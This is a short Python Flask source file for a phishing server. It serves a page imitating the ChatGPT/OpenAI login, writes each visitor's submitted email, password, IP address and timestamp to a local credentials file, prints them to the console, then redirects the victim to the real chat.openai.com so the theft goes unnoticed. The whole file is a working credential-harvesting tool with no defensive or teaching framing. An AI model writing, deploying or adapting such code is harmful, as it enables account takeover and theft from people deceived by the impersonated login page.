from flask import Flask, render_template, request, redirect
import os
import datetime
import flask.cli
import logging

flask.cli.show_server_banner = lambda *a, **k: None
logging.getLogger('werkzeug').setLevel(logging.ERROR)

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

path = "OpenAI_Credentials"
os.makedirs(path, exist_ok=True)
LOG_FILE = "OpenAI_login.txt"
full = os.path.join(path, LOG_FILE)

if not os.path.exists(full):
    with open(full, "a", encoding="utf-8") as f:
        f.write("🔥 OpenAI Login 🔥\n")
        f.write("="*50 + "\n\n")

@app.route('/')
def login_page():
    return render_template('chatgpt.html')

@app.route('/login', methods=['POST'])
def handle_login():
    email = request.form.get('email', '')
    password = request.form.get('password', '')

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip_address = request.remote_addr

    with open(full, 'a', encoding='utf-8') as f:
        f.write(f"Time: {timestamp} | IP: {ip_address} | Email: {email} | Password: {password}\n\n")
        print(f"✅ Save Information: {email} - {password} - IP: {ip_address}")

    return redirect("https://chat.openai.com/")

def run():
    app.run(host="0.0.0.0", port=5001, debug=False, use_reloader=False)

if __name__ == '__main__':
    run()